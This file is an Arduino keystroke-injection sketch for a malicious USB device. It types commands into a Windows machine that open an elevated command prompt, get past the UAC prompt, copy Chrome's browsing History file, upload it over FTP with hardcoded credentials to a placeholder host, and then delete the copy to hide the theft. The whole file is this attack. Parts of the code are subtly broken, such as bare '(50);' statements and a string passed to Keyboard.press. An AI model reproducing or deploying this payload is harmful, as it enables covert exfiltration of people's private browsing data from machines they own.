#include <Keyboard.h>

void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  delay(450);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(450);
  
    
  Keyboard.print("powershell Start-Process cmd -Verb runAs");
  delay(500);
  typeKey(KEY_RETURN);
  delay(3000);
  
  Keyboard.write(0xD8);
 
  typeKey(KEY_RETURN);
  delay(500);

  
  // *****************
  // # Now to grab the file
  // *****************
  Keyboard.print("cd \"%LocalAppData%\\Google\\Chrome\\User Data\\Default");
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);
 
  Keyboard.print("del C:\\history  ");
  (50);
  typeKey(KEY_RETURN);
  Keyboard.print("copy history C:\\ ");
  (30);
  typeKey(KEY_RETURN);
  delay(1000);
  
  Keyboard.print("cd \"%USERPROFILE%");
  delay(20);
  typeKey(KEY_RETURN);
   // *****************
  // Opening connection to external FTP server
  // *****************
  // Enter Host Name
  Keyboard.print("ftp -i 127.0.0.1"); 
  delay(30);
  typeKey(KEY_RETURN);
  delay(800);
   
  // Enter Username and Passwd
   Keyboard.print("sap");
   typeKey(KEY_RETURN); 
   delay(100);
   
   Keyboard.print("sap");
   delay(20);
   typeKey(KEY_RETURN);
   delay(60);
   
   Keyboard.press("put C:\\History");
   typeKey(KEY_RETURN);
   delay(10000);
   Keyboard.print("quit");
   delay(30);
   typeKey(KEY_RETURN);
   
   
  // *****************
  //  Cleanup
  // *****************
  Keyboard.print("del  C:\\History");
  delay(60);
  typeKey(KEY_RETURN);
  Keyboard.print("exit");
  typeKey(KEY_RETURN);

  // Ending stream
   Keyboard.end();
}


void loop() {
  // put your main code here, to run repeatedly:

}
